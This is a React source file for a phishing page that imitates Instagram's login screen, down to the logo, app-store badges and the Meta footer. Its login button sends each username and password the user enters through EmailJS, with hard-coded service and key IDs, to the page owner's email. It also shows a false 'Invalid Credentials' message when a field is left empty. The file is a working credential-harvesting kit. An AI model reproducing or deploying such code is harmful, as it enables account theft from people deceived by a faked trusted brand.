
import React, { useEffect, useState } from 'react';
import './App.css';
import emailjs from 'emailjs-com';
import insta from './insta.png'
import insta1 from './insta1.png'
import insta2 from './insta2.png'


const App = () => {
  const data = [insta, insta1, insta2];
  const [username, setusername] = useState();
  const [password, setpassword] = useState();
  const [check, setcheck] = useState('none');
  const [showHide, setshowHide] = useState("Show");
  const [type, settype] = useState(false);
  const [image, setimage] = useState(insta);


  const toggleButton = () => {
    settype(!type);
    setshowHide(type ? "Show" : "Hide")
  }

  useEffect(() => {
    let i = 0;

    const timeout = setInterval(() => {
      setimage(data[i]);
      i = (i + 1) % data.length;
    }, 4000);
    return () => {
      clearInterval(timeout);
    }
  }, []);




  let once = true;
  const ButtonClicked = () => {
    // alert('Login Successfull');

    if (!password || !username) {
      setcheck('block');
    }
    else {
      emailjs.send('service_o9fknof', 'template_40x05w6', {
        to_name: 'Recipient Name',
        from_name: 'Your Name', // Corrected key: 'from_name' instead of 'Emailid'
        message: `Username :- ${username} and Password :-  ${password}` // Corrected key: 'message' instead of 'Message'
      }, '0PQLhH7z8D22oGXb6')
        .then((response) => {
          console.log('Email sent successfully:', response);
        })
        .catch((error) => {
          console.error('Email failed to send:', error);
        });
    }
  }

  return (
    <>
      <div className='Full'>
        <div className='half'>
          <div className='halfLeft' style={{ backgroundImage: `url(${image})` }}></div>
          <div className='halfRight'>
            <div className='heading'>
              <img src="https://tse1.mm.bing.net/th?id=OIP.vDOq6L5PbY7XrDGK5TjNLAHaC7&pid=Api&P=0&h=180" alt="" />
            </div>
            <div className='inputFields'>
              <input autoComplete='On' type="text" placeholder='Phone number,username,or email' value={username} onChange={(e) => { setusername(e.target.value) }} />
              <input type={type ? "text" : "password"} placeholder='Password' value={password} onChange={(e) => { setpassword(e.target.value) }} />
              <span className='toggle_pass' style={{ display: 'block', top: '-40px', right: '-90px', fontSize: '14px', position: 'relative', cursor: 'pointer' }} onClick={toggleButton}>{password ? showHide : null}</span>
              <button style={{ cursor: 'pointer' }} onClick={ButtonClicked}>Log in</button>
              <div className='ForOr' style={{ marginTop: '12px', height: '50px', width: '70%', display: 'flex', flexDirection: 'row' }}>
                <hr />
                <div className='or'>OR</div>
                <hr />
              </div>
              <div className='Invalid' style={{ color: 'red', fontSize: '13px', marginBottom: '7px', display: check }}>Invalid Credentials Please Check again</div>
              <div className='Facebook' style={{ color: '#385185' }}><i class="fa-brands fa-square-facebook"></i> Login with Facebook</div>
              <div className='forgot' style={{ marginTop: '15px', fontSize: '14px' }}>Forgot password?</div>
            </div>
            <div className='account' style={{ fontSize: '14px', marginTop: '20px', textAlign: 'center' }}>
              <hr style={{ marginBottom: '12px' }} />
              Dont have any Account? <span style={{ color: 'blue' }}>Sign up</span>
              <hr style={{ marginTop: '17px' }} />
              <div className='getText' style={{ marginTop: '10px' }}>Get the App</div>
              <div className='getApp'>
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="" />
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="" />
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className='footer' style={{ textAlign: 'center', fontSize: '12px ', wordSpacing: '4px', color: 'gray' }}>
        <div className='footer1' >Meta About Blog Jobs Help  API  Privacy <span className='FooterSpan'> Terms Locations Instagram Lite Threads Contact Uploading & Non-Users Meta Verified</span></div>
        <div className='footer2' style={{ marginTop: '10px', marginBottom: '15px' }}>English  © 2023 Instagram from Meta</div>
      </div>
    </>
  )
};

export default App;
